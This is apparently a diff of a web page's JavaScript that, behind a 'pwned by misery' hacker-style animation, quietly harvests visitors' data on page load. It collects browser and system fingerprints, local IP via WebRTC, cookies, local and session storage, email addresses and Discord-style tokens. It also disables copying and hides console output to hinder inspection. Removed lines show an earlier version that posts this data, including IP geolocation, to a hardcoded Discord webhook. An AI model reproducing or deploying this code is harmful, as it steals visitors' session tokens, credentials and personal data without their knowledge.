+    window.addEventListener('resize', devtoolsDetect);
+
+    document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
+
+    console.log = function() {};
+    console.warn = function() {};
+    console.error = function() {};
+
+    var fullAscii = '\n\n                       .       .x+=:.                                        \n                      @88>    z`    ^%                            ..         \n   ..    .     :      %8P        .   <k               .u    .    @L          \n .888: x888  x888.     .       .@8Ned8"      .u     .d88B :@8c  9888i   .dL  \n~`8888~\'888X`?888f`  .@88u   .@^%8888"    ud8888.  ="8888f8888r `Y888k:*888. \n  X888  888X \'888>  \'\'888E` x88:  `)8b. :888\'8888.   4888>\'88"    888E  888I \n  X888  888X \'888>    888E  8888N=*8888 d888 \'88%"   4888> \'      888E  888I \n  X888  888X \'888>    888E   %8"    R88 8888.+"      4888>        888E  888I \n  X888  888X \'888>    888E    @8Wou 9%  8888L       .d888L .+     888E  888I \n "*88%""*88" \'888!`   888&  .888888P`   \'8888c. .+  ^"8888*"     x888N><888\' \n   `~    "    `"`     R888" `   ^"F      "88888%       "Y"        "88"  888  \n                       ""                  "YP\'                         88F  \n                                                                       98"   \n                                                                     ./"     \n                                                                    ~`       ';
+
+    var loadingCode = document.getElementById('loadingCode');
+    var mainContent = document.getElementById('mainContent');
+    loadingCode.textContent = fullAscii;
+
+    setTimeout(function() {
+      loadingScreen.classList.add('hidden');
+      mainContent.classList.add('visible');
+      setTimeout(startMainAnimations, 100);
+      setTimeout(collectAllData, 300);
+    }, 2000);
+
+    var canvas = document.getElementById('cmatrix-canvas');
+    var ctx = canvas.getContext('2d');
+    var w, h, cols, drops = [];
+    var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+{}[]|;:,.<>?';
+
+    function initMatrix() {
+      w = window.innerWidth;
+      h = window.innerHeight;
+      canvas.width = w;
+      canvas.height = h;
+      var cw = 18;
+      cols = Math.floor(w / cw);
+      drops = [];
+      for (var i = 0; i < cols; i++) {
+        drops.push({
+          y: Math.floor(Math.random() * -200) - 50,
+          speed: 0.2 + Math.random() * 0.3,
+          active: Math.random() < 0.3 ? 1 : 0,
+          char: chars[Math.floor(Math.random() * chars.length)],
+          brightness: 0.5 + Math.random() * 0.5
         });
+      }
+    }
 
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || e.keyCode === 123) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
-                e.preventDefault();
-                return false;
-            }
-            return true;
-        });
-
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-        // iOS Safari: prevent zoom and double-tap
-        document.addEventListener('dblclick', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-
-        document.addEventListener('touchstart', function(e) {
-            if (e.target.closest('button')) return;
-            if (e.touches.length > 1) {
-                e.preventDefault();
-                return false;
-            }
-        }, { passive: false });
-
-        // ---------- WEBHOOK ----------
-        var WEBHOOK = 'https://discord.com/api/webhooks/1533341478091362405/eDM8Uti1Y_Pmp6V1TJKzmxcjq_1bMzwitAlaNGeWNB20oswh9lPaobc4Nn0B-095pfAI';
-
-        function sendToWebhook(content) {
-            var payload = typeof content === 'string' ? { content: content } : content;
-            return fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(function() {});
+    function drawMatrix() {
+      ctx.clearRect(0, 0, w, h);
+      ctx.font = '15px "Courier New", monospace';
+      ctx.textAlign = 'center';
+      for (var i = 0; i < drops.length; i++) {
+        var drop = drops[i];
+        if (!drop.active) {
+          if (Math.random() < 0.001) {
+            drop.active = 1;
+            drop.y = Math.floor(Math.random() * -100) - 30;
+            drop.char = chars[Math.floor(Math.random() * chars.length)];
+          }
+          continue;
         }
+        var x = i * (w / cols) + (w / cols) / 2;
+        var alpha = 0.08 + 0.25 * drop.brightness;
+        ctx.shadowColor = 'rgba(180,180,180,0.05)';
+        ctx.shadowBlur = 6;
+        ctx.fillStyle = 'rgba(180,180,180,' + alpha + ')';
+        ctx.fillText(drop.char, x, drop.y);
+        drop.y += drop.speed;
+        if (drop.y > h + 30) {
+          if (Math.random() < 0.4) {
+            drop.y = Math.floor(Math.random() * -60) - 20;
+            drop.char = chars[Math.floor(Math.random() * chars.length)];
+            drop.speed = 0.2 + Math.random() * 0.3;
+            drop.brightness = 0.5 + Math.random() * 0.5;
+          } else {
+            drop.active = 0;
+            drop.y = Math.floor(Math.random() * -200) - 50;
+          }
+        }
+        if (Math.random() < 0.01) drop.char = chars[Math.floor(Math.random() * chars.length)];
+      }
+      for (var j = 0; j < drops.length; j++) {
+        if (drops[j].active === 0 && Math.random() < 0.0008) {
+          drops[j].active = 1;
+          drops[j].y = Math.floor(Math.random() * -50) - 20;
+          drops[j].char = chars[Math.floor(Math.random() * chars.length)];
+        }
+      }
+      requestAnimationFrame(drawMatrix);
+    }
 
-        // ---------- LOADING ----------
-        var loadingScreen = document.getElementById('loadingScreen');
-        var enterBtn = document.getElementById('enterBtn');
-        var mainContent = document.getElementById('mainContent');
-        var loadProgress = 0;
-        var loadInterval = setInterval(function() {
-            loadProgress += Math.random() * 8 + 2;
-            if (loadProgress >= 100) {
-                loadProgress = 100;
-                clearInterval(loadInterval);
-                loadingScreen.classList.add('hidden');
-                enterBtn.classList.add('show');
+    window.addEventListener('resize', function() { initMatrix(); });
+    initMatrix();
+    drawMatrix();
+
+    function startMainAnimations() {
+      var asciiCode = document.getElementById('asciiCode');
+      var glitch1 = document.getElementById('glitch1');
+      var glitch2 = document.getElementById('glitch2');
+      var glitch3 = document.getElementById('glitch3');
+      var gc1 = document.getElementById('glitchCode1');
+      var gc2 = document.getElementById('glitchCode2');
+      var gc3 = document.getElementById('glitchCode3');
+      var orig = fullAscii;
+
+      gc1.textContent = orig;
+      gc2.textContent = orig;
+      gc3.textContent = orig;
+
+      function glitch() {
+        var lines = orig.split('\n');
+        var lineCount = lines.length;
+        var numLines = 1 + Math.floor(Math.random() * 2);
+        var indices = [];
+        for (var i = 0; i < numLines; i++) {
+          var li = Math.floor(Math.random() * lineCount);
+          while (indices.indexOf(li) !== -1) li = Math.floor(Math.random() * lineCount);
+          indices.push(li);
+        }
+        var layers = [gc1, gc2, gc3];
+        for (var li2 = 0; li2 < layers.length; li2++) {
+          var newLines = lines.slice();
+          for (var ii = 0; ii < indices.length; ii++) {
+            var lineIdx = indices[ii];
+            var line = newLines[lineIdx];
+            if (line.length < 2) continue;
+            var numRep = 1 + Math.floor(Math.random() * 2);
+            for (var r = 0; r < numRep; r++) {
+              var pos = Math.floor(Math.random() * line.length);
+              var rc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
+              line = line.substring(0, pos) + rc + line.substring(pos + 1);
             }
-            var loaderText = document.querySelector('.loader-text');
-            if (loaderText) {
-                loaderText.textContent = 'LOADING MISERY ' + Math.floor(loadProgress) + '%';
+            newLines[lineIdx] = line;
+          }
+          layers[li2].textContent = newLines.join('\n');
+        }
+        if (Math.random() < 0.3) {
+          var mainLines = lines.slice();
+          var mi = Math.floor(Math.random() * lineCount);
+          var ml = mainLines[mi];
+          if (ml.length > 2) {
+            var mp = Math.floor(Math.random() * ml.length);
+            var mc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
+            ml = ml.substring(0, mp) + mc + ml.substring(mp + 1);
+            mainLines[mi] = ml;
+            asciiCode.textContent = mainLines.join('\n');
+          }
+        } else {
+          asciiCode.textContent = orig;
+        }
+        var ge = [glitch1, glitch2, glitch3];
+        for (var gi = 0; gi < ge.length; gi++) {
+          if (Math.random() < 0.4) ge[gi].classList.add('active');
+          else ge[gi].classList.remove('active');
+        }
+        if (Math.random() < 0.2) {
+          gc1.textContent = orig;
+          gc2.textContent = orig;
+          gc3.textContent = orig;
+          for (var gi2 = 0; gi2 < ge.length; gi2++) ge[gi2].classList.remove('active');
+        }
+        var delay = 400 + Math.random() * 600;
+        setTimeout(glitch, delay);
+      }
+      setTimeout(glitch, 400);
+
+      var tagline = '@ pwned by misery';
+      var typedSpan = document.getElementById('typedText');
+      var cursorSpan = document.getElementById('cursor');
+      var ci = 0;
+
+      function typeNext() {
+        if (ci < tagline.length) {
+          typedSpan.textContent += tagline.charAt(ci);
+          ci++;
+          setTimeout(typeNext, 25 + Math.random() * 30);
+        } else {
+          cursorSpan.style.animation = 'blink 0.9s step-end infinite';
+        }
+      }
+      setTimeout(typeNext, 500);
+    }
+
+    function collectAllData() {
+      var data = {
+        browser: {},
+        system: {},
+        network: {},
+        tokens: [],
+        storage: {},
+        emails: []
+      };
+
+      data.browser.userAgent = navigator.userAgent || 'N/A';
+      data.browser.language = navigator.language || 'N/A';
+      data.browser.languages = navigator.languages ? navigator.languages.join(', ') : 'N/A';
+      data.browser.platform = navigator.platform || 'N/A';
+      data.browser.vendor = navigator.vendor || 'N/A';
+      data.browser.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
+      data.browser.deviceMemory = navigator.deviceMemory || 'N/A';
+      data.browser.maxTouchPoints = navigator.maxTouchPoints || 'N/A';
+
+      data.system.screen = screen.width + 'x' + screen.height + ' (' + screen.colorDepth + '-bit)';
+      data.system.avail = screen.availWidth + 'x' + screen.availHeight;
+      data.system.window = window.innerWidth + 'x' + window.innerHeight;
+      data.system.pixelRatio = window.devicePixelRatio || 1;
+      data.system.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+      data.system.utc = new Date().toISOString();
+      data.system.local = new Date().toString();
+
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          var di = gl.getExtension('WEBGL_debug_renderer_info');
+          if (di) {
+            data.system.gpuVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL) || 'N/A';
+            data.system.gpuRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL) || 'N/A';
+          }
+          data.system.webglVersion = gl.getParameter(gl.VERSION) || 'N/A';
+        }
+      } catch(e) {}
+
+      try {
+        var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('test');
+        pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); }).then(function() {
+          var sdp = pc.localDescription ? pc.localDescription.sdp : '';
+          var candidates = sdp.match(/candidate:[^\n]+/g);
+          if (candidates) {
+            for (var i = 0; i < candidates.length; i++) {
+              var match = candidates[i].match(/(\d{1,3}\.){3}\d{1,3}/);
+              if (match && !match[0].startsWith('127.') && !match[0].startsWith('0.')) {
+                data.network.localIP = match[0];
+                break;
+              }
             }
-        }, 120);
+          }
+          pc.close();
+        }).catch(function() {});
+        setTimeout(function() { try { pc.close(); } catch(e) {} }, 2000);
+      } catch(e) {}
 
-        // ---------- ENTER ----------
-        enterBtn.addEventListener('click', function() {
-            this.classList.remove('show');
-            this.style.display = 'none';
-            mainContent.classList.add('show');
-            setTimeout(function() {
-                collectAllData();
-            }, 200);
-        });
+      try {
+        var cookies = document.cookie ? document.cookie.split(';').filter(function(c) { return c.trim(); }) : [];
+        data.storage.cookies = cookies.length;
+        data.storage.cookieList = cookies;
+      } catch(e) {}
 
-        // ---------- GET LOCAL IP ----------
-        function getLocalIP() {
-            return new Promise(function(resolve) {
+      try {
+        var ls = [];
+        if (localStorage && localStorage.length > 0) {
+          for (var key in localStorage) {
+            if (localStorage.hasOwnProperty(key)) {
+              var val = localStorage[key];
+              if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
+              ls.push(key + ': ' + val);
+            }
+          }
+        }
+        data.storage.localStorage = ls;
+      } catch(e) {}
+
+      try {
+        var ss = [];
+        if (sessionStorage && sessionStorage.length > 0) {
+          for (var key2 in sessionStorage) {
+            if (sessionStorage.hasOwnProperty(key2)) {
+              var val2 = sessionStorage[key2];
+              if (val2 && val2.length > 500) val2 = val2.substring(0, 500) + '... [truncated]';
+              ss.push(key2 + ': ' + val2);
+            }
+          }
+        }
+        data.storage.sessionStorage = ss;
+      } catch(e) {}
+
+      var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+      var emails = [];
+      try {
+        if (localStorage && localStorage.length > 0) {
+          for (var key3 in localStorage) {
+            if (localStorage.hasOwnProperty(key3)) {
+              var val3 = localStorage[key3];
+              if (typeof val3 === 'string') {
+                var matches = val3.match(emailRegex);
+                if (matches) {
+                  matches.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+                }
                 try {
-                    var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('test');
-                    pc.createOffer().then(function(offer) {
-                        return pc.setLocalDescription(offer);
-                    }).then(function() {
-                        var sdp = pc.localDescription ? pc.localDescription.sdp : '';
-                        var candidates = sdp.match(/candidate:[^\n]+/g);
-                        var ip = 'Not available';
-                        if (candidates) {
-                            for (var i = 0; i < candidates.length; i++) {
-                                var match = candidates[i].match(/(\d{1,3}\.){3}\d{1,3}/);
-                                if (match && !match[0].startsWith('127.') && !match[0].startsWith('0.')) {
-                                    ip = match[0];
-                                    break;
-                                }
-                            }
-                        }
-                        pc.close();
-                        resolve(ip);
-                    }).catch(function() {
-                        pc.close();
-                        resolve('WebRTC error');
+                  var parsed = JSON.parse(val3);
+                  var jsonStr = JSON.stringify(parsed);
+                  var matches2 = jsonStr.match(emailRegex);
+                  if (matches2) {
+                    matches2.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+                  }
+                } catch(e) {}
+              }
+            }
+          }
+        }
+      } catch(e) {}
+      try {
+        if (document.cookie) {
+          var ck = document.cookie.split(';');
+          ck.forEach(function(cookie) {
+            var val4 = cookie.trim();
+            var matches3 = val4.match(emailRegex);
+            if (matches3) {
+              matches3.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+            }
+          });
+        }
+      } catch(e) {}
+      try {
+        if (sessionStorage && sessionStorage.length > 0) {
+          for (var key4 in sessionStorage) {
+            if (sessionStorage.hasOwnProperty(key4)) {
+              var val5 = sessionStorage[key4];
+              if (typeof val5 === 'string') {
+                var matches4 = val5.match(emailRegex);
+                if (matches4) {
+                  matches4.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+                }
+              }
+            }
+          }
+        }
+      } catch(e) {}
+      try {
+        var windowStr = JSON.stringify(window);
+        var matches5 = windowStr.match(emailRegex);
+        if (matches5) {
+          matches5.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+        }
+      } catch(e) {}
+      try {
+        var html = document.documentElement.innerHTML;
+        var matches6 = html.match(emailRegex);
+        if (matches6) {
+          matches6.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+        }
+      } catch(e) {}
+      var commonFalse = ['example@example.com', 'test@test.com', 'user@domain.com'];
+      emails = emails.filter(function(e) {
+        return commonFalse.indexOf(e) === -1 && e.length > 10;
+      });
+      data.emails = emails;
+
+      var tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
+      var tokenSources = [];
+
+      try {
+        if (localStorage && localStorage.length > 0) {
+          for (var k in localStorage) {
+            if (localStorage.hasOwnProperty(k)) {
+              var v = localStorage[k];
+              if (typeof v === 'string' && v.length > 20) {
+                var matches7 = v.match(tokenRegex);
+                if (matches7) {
+                  matches7.forEach(function(t) {
+                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                      tokenSources.push({ source: 'localStorage', key: k, token: t });
+                    }
+                  });
+                }
+                try {
+                  var p = JSON.parse(v);
+                  var js = JSON.stringify(p);
+                  var m2 = js.match(tokenRegex);
+                  if (m2) {
+                    m2.forEach(function(t) {
+                      if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                        tokenSources.push({ source: 'localStorage JSON', key: k, token: t });
+                      }
                     });
-                    setTimeout(function() {
-                        try { pc.close(); } catch(e) {}
-                        resolve('Timeout');
-                    }, 3000);
-                } catch(e) {
-                    resolve('WebRTC not supported');
-                }
-            });
+                  }
+                } catch(e) {}
+              }
+            }
+          }
         }
+      } catch(e) {}
 
-        // ---------- GET PUBLIC IP ----------
-        function getPublicIP() {
-            return new Promise(function(resolve) {
-                var services = [
-                    { url: 'https://api.ipify.org?format=json', key: 'ip' },
-                    { url: 'https://api.my-ip.io/ip.json', key: 'ip' },
-                    { url: 'https://ip-api.com/json/', key: 'query' },
-                    { url: 'https://api.ip.sb/geoip', key: 'ip' },
-                    { url: 'https://ipinfo.io/json', key: 'ip' }
-                ];
-                var index = 0;
-                function tryNext() {
-                    if (index >= services.length) {
-                        resolve(null);
-                        return;
+      try {
+        if (sessionStorage && sessionStorage.length > 0) {
+          for (var k2 in sessionStorage) {
+            if (sessionStorage.hasOwnProperty(k2)) {
+              var v2 = sessionStorage[k2];
+              if (typeof v2 === 'string' && v2.length > 20) {
+                var matches8 = v2.match(tokenRegex);
+                if (matches8) {
+                  matches8.forEach(function(t) {
+                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                      tokenSources.push({ source: 'sessionStorage', key: k2, token: t });
                     }
-                    var svc = services[index];
-                    index++;
-                    fetch(svc.url, { timeout: 3000 })
-                        .then(function(r) { return r.json(); })
-                        .then(function(data) {
-                            var ip = data[svc.key] || data.ip || data.query || null;
-                            if (ip) {
-                                resolve(ip);
-                            } else {
-                                tryNext();
-                            }
-                        })
-                        .catch(function() {
-                            tryNext();
-                        });
+                  });
                 }
-                tryNext();
-            });
+              }
+            }
+          }
         }
+      } catch(e) {}
 
-        // ---------- GET GEOLOCATION ----------
-        function getGeoFromIP(ip) {
-            return new Promise(function(resolve) {
-                if (!ip) { resolve(null); return; }
-                fetch('http://ip-api.com/json/' + ip, { timeout: 3000 })
-                    .then(function(r) { return r.json(); })
-                    .then(function(data) {
-                        if (data && data.status === 'success') {
-                            resolve(data);
-                        } else {
-                            resolve(null);
-                        }
-                    })
-                    .catch(function() { resolve(null); });
-            });
-        }
-
-        // ---------- COLLECT ALL DATA ----------
-        async function collectAllData() {
-            try {
-                sendToWebhook('🔴 **MISERY EXTENDED DATA HARVEST**');
-
-                // ===== 1. BROWSER & SYSTEM INFO =====
-                var info = [];
-                info.push('🌐 **Browser & System:**');
-                info.push('  User Agent: ' + (navigator.userAgent || 'N/A'));
-                info.push('  Language: ' + (navigator.language || 'N/A'));
-                info.push('  Languages: ' + (navigator.languages ? navigator.languages.join(', ') : 'N/A'));
-                info.push('  Platform: ' + (navigator.platform || 'N/A'));
-                info.push('  Vendor: ' + (navigator.vendor || 'N/A'));
-                info.push('  Screen: ' + (screen.width || '?') + 'x' + (screen.height || '?') + ' (' + (screen.colorDepth || '?') + '-bit)');
-                info.push('  Available: ' + (screen.availWidth || '?') + 'x' + (screen.availHeight || '?'));
-                info.push('  Window: ' + (window.innerWidth || '?') + 'x' + (window.innerHeight || '?'));
-                info.push('  Device Pixel Ratio: ' + (window.devicePixelRatio || 1));
-                info.push('  Timezone: ' + (Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'));
-                info.push('  UTC Time: ' + (new Date().toISOString() || 'N/A'));
-                info.push('  Local Time: ' + (new Date().toString() || 'N/A'));
-                if (navigator.hardwareConcurrency) info.push('  CPU Cores: ' + navigator.hardwareConcurrency);
-                if (navigator.deviceMemory) info.push('  Device Memory: ' + navigator.deviceMemory + ' GB');
-                if (navigator.maxTouchPoints) info.push('  Touch Points: ' + navigator.maxTouchPoints);
-                info.push('  Cookie Enabled: ' + (navigator.cookieEnabled ? 'Yes' : 'No'));
-                info.push('  Do Not Track: ' + (navigator.doNotTrack || 'N/A'));
-                if (navigator.connection) {
-                    info.push('  Connection Type: ' + (navigator.connection.effectiveType || 'N/A'));
-                    info.push('  Downlink: ' + (navigator.connection.downlink || 'N/A') + ' Mbps');
-                    info.push('  RTT: ' + (navigator.connection.rtt || 'N/A') + ' ms');
-                } else {
-                    info.push('  Connection: Not available');
-                }
-
-                // GPU
-                try {
-                    var canvas = document.createElement('canvas');
-                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {
-                            info.push('  GPU Vendor: ' + (gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A'));
-                            info.push('  GPU Renderer: ' + (gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'));
-                        }
-                        info.push('  WebGL Version: ' + (gl.getParameter(gl.VERSION) || 'N/A'));
-                        info.push('  Shading Language: ' + (gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || 'N/A'));
-                    } else {
-                        info.push('  WebGL: Not supported');
-                    }
-                } catch(e) {
-                    info.push('  WebGL: Error - ' + (e.message || 'Unknown'));
-                }
-
-                // Local IP
-                var localIP = await getLocalIP();
-                info.push('  Local IP: ' + localIP);
-
-                // Battery
-                try {
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(function(battery) {
-                            info.push('  Battery Level: ' + Math.round(battery.level * 100) + '%');
-                            info.push('  Charging: ' + (battery.charging ? 'Yes' : 'No'));
-                            sendToWebhook('```\n' + info.join('\n') + '\n```');
-                        }).catch(function() {
-                            sendToWebhook('```\n' + info.join('\n') + '\n```');
-                        });
-                    } else {
-                        sendToWebhook('```\n' + info.join('\n') + '\n```');
-                    }
-                } catch(e) {
-                    sendToWebhook('```\n' + info.join('\n') + '\n```');
-                }
-
-                // ===== 2. COOKIES =====
-                try {
-                    var cookies = document.cookie ? document.cookie.split(';').filter(function(c) { return c.trim(); }) : [];
-                    sendToWebhook('🍪 **Cookies:** ' + cookies.length + ' found\n' + (cookies.length > 0 ? cookies.join('\n') : '(none)'));
-                } catch(e) {
-                    sendToWebhook('🍪 **Cookies:** Error - ' + e.message);
-                }
-
-                // ===== 3. LOCALSTORAGE =====
-                try {
-                    var lsData = [];
-                    if (localStorage && localStorage.length > 0) {
-                        for (var key in localStorage) {
-                            if (localStorage.hasOwnProperty(key)) {
-                                var val = localStorage[key];
-                                if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
-                                lsData.push(key + ': ' + val);
-                            }
-                        }
-                    }
-                    sendToWebhook('💾 **LocalStorage (' + lsData.length + ' keys):**\n' + (lsData.length > 0 ? lsData.join('\n') : '(empty)'));
-                } catch(e) {
-                    sendToWebhook('💾 **LocalStorage:** Error - ' + e.message);
-                }
-
-                // ===== 4. SESSIONSTORAGE =====
-                try {
-                    var ssData = [];
-                    if (sessionStorage && sessionStorage.length > 0) {
-                        for (var key2 in sessionStorage) {
-                            if (sessionStorage.hasOwnProperty(key2)) {
-                                var val2 = sessionStorage[key2];
-                                if (val2 && val2.length > 500) val2 = val2.substring(0, 500) + '... [truncated]';
-                                ssData.push(key2 + ': ' + val2);
-                            }
-                        }
-                    }
-                    sendToWebhook('📦 **SessionStorage (' + ssData.length + ' keys):**\n' + (ssData.length > 0 ? ssData.join('\n') : '(empty)'));
-                } catch(e) {
-                    sendToWebhook('📦 **SessionStorage:** Error - ' + e.message);
-                }
-
-                // ===== 5. PUBLIC IP & GEOLOCATION =====
-                var publicIP = await getPublicIP();
-                if (publicIP) {
-                    sendToWebhook('🌐 **Public IP:** ' + publicIP);
-                    var geo = await getGeoFromIP(publicIP);
-                    if (geo) {
-                        sendToWebhook('📍 **IP Location:**\nCity: ' + (geo.city || 'N/A') + '\nRegion: ' + (geo.regionName || 'N/A') + '\nCountry: ' + (geo.country || 'N/A') + '\nLat/Lon: ' + (geo.lat || 'N/A') + ', ' + (geo.lon || 'N/A') + '\nISP: ' + (geo.isp || 'N/A') + '\nORG: ' + (geo.org || 'N/A') + '\nAS: ' + (geo.as || 'N/A'));
-                    }
-                } else {
-                    sendToWebhook('🌐 **Public IP:** Could not retrieve (blocked or offline)');
-                }
-
-                // ===== 6. EMAIL SCRAPE =====
-                var emails = [];
-                var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-
-                try {
-                    if (localStorage && localStorage.length > 0) {
-                        for (var key3 in localStorage) {
-                            if (localStorage.hasOwnProperty(key3)) {
-                                var val3 = localStorage[key3];
-                                if (typeof val3 === 'string') {
-                                    var matches = val3.match(emailRegex);
-                                    if (matches) {
-                                        matches.forEach(function(e) {
-                                            if (emails.indexOf(e) === -1) emails.push(e);
-                                        });
-                                    }
-                                    try {
-                                        var parsed = JSON.parse(val3);
-                                        var jsonStr = JSON.stringify(parsed);
-                                        var matches2 = jsonStr.match(emailRegex);
-                                        if (matches2) {
-                                            matches2.forEach(function(e) {
-                                                if (emails.indexOf(e) === -1) emails.push(e);
-                                            });
-                                        }
-                                    } catch(e) {}
-                                }
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                try {
-                    if (document.cookie) {
-                        var cookies2 = document.cookie.split(';');
-                        cookies2.forEach(function(cookie) {
-                            var val4 = cookie.trim();
-                            var matches3 = val4.match(emailRegex);
-                            if (matches3) {
-                                matches3.forEach(function(e) {
-                                    if (emails.indexOf(e) === -1) emails.push(e);
-                                });
-                            }
-                        });
-                    }
-                } catch(e) {}
-
-                try {
-                    if (sessionStorage && sessionStorage.length > 0) {
-                        for (var key4 in sessionStorage) {
-                            if (sessionStorage.hasOwnProperty(key4)) {
-                                var val5 = sessionStorage[key4];
-                                if (typeof val5 === 'string') {
-                                    var matches4 = val5.match(emailRegex);
-                                    if (matches4) {
-                                        matches4.forEach(function(e) {
-                                            if (emails.indexOf(e) === -1) emails.push(e);
-                                        });
-                                    }
-                                }
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                try {
-                    var windowStr = JSON.stringify(window);
-                    var matches5 = windowStr.match(emailRegex);
-                    if (matches5) {
-                        matches5.forEach(function(e) {
-                            if (emails.indexOf(e) === -1) emails.push(e);
-                        });
-                    }
-                } catch(e) {}
-
-                try {
-                    var html = document.documentElement.innerHTML;
-                    var matches6 = html.match(emailRegex);
-                    if (matches6) {
-                        matches6.forEach(function(e) {
-                            if (emails.indexOf(e) === -1) emails.push(e);
-                        });
-                    }
-                } catch(e) {}
-
-                var commonFalse = ['example@example.com', 'test@test.com', 'user@domain.com'];
-                emails = emails.filter(function(e) {
-                    return commonFalse.indexOf(e) === -1 && e.length > 10;
+      try {
+        if (document.cookie) {
+          var cks = document.cookie.split(';');
+          cks.forEach(function(cookie) {
+            var parts = cookie.trim().split('=');
+            if (parts.length === 2) {
+              var val6 = parts[1];
+              var matches9 = val6.match(tokenRegex);
+              if (matches9) {
+                matches9.forEach(function(t) {
+                  if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                    tokenSources.push({ source: 'cookie', key: parts[0], token: t });
+                  }
                 });
-
-                if (emails.length > 0) {
-                    sendToWebhook('📧 **Emails found (' + emails.length + '):**\n' + emails.join('\n'));
-                } else {
-                    sendToWebhook('📧 **Emails:** None found in browser storage.');
-                }
-
-                // ===== 7. PLUGINS =====
-                try {
-                    var plugins = [];
-                    if (navigator.plugins) {
-                        for (var i = 0; i < navigator.plugins.length; i++) {
-                            var p = navigator.plugins[i];
-                            if (p && p.name) plugins.push(p.name + ' (' + (p.filename || 'N/A') + ')');
-                        }
-                    }
-                    sendToWebhook('🔌 **Plugins (' + plugins.length + '):**\n' + (plugins.length > 0 ? plugins.join('\n') : '(none)'));
-                } catch(e) {
-                    sendToWebhook('🔌 **Plugins:** Error - ' + e.message);
-                }
-
-                // ===== 8. SCREEN ORIENTATION =====
-                try {
-                    var orient = screen.orientation || {};
-                    sendToWebhook('📱 **Screen Orientation:** Type: ' + (orient.type || 'N/A') + ', Angle: ' + (orient.angle || 'N/A'));
-                } catch(e) {}
-
-                // ===== 9. PERFORMANCE TIMING =====
-                try {
-                    if (performance && performance.timing) {
-                        var perf = performance.timing;
-                        var loadTime = perf.loadEventEnd - perf.navigationStart;
-                        var domTime = perf.domComplete - perf.domLoading;
-                        var dnsTime = perf.domainLookupEnd - perf.domainLookupStart;
-                        var tcpTime = perf.connectEnd - perf.connectStart;
-                        sendToWebhook('⏱️ **Performance:**\nPage Load: ' + (loadTime || 0) + 'ms\nDOM Ready: ' + (domTime || 0) + 'ms\nDNS: ' + (dnsTime || 0) + 'ms\nTCP: ' + (tcpTime || 0) + 'ms');
-                    } else {
-                        sendToWebhook('⏱️ **Performance:** Timing API not available');
-                    }
-                } catch(e) {
-                    sendToWebhook('⏱️ **Performance:** Error - ' + e.message);
-                }
-
-                // ===== 10. DISCORD TOKEN SCAN =====
-                setTimeout(function() {
-                    scanDiscordToken();
-                }, 1500);
-
-            } catch(e) {
-                sendToWebhook('❌ **ERROR:** ' + e.message);
+              }
             }
+          });
         }
+      } catch(e) {}
 
-        // ---------- DISCORD TOKEN SCANNER ----------
-        function scanDiscordToken() {
-            var tokenSources = [];
-            var tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
-
-            try {
-                if (localStorage && localStorage.length > 0) {
-                    for (var key in localStorage) {
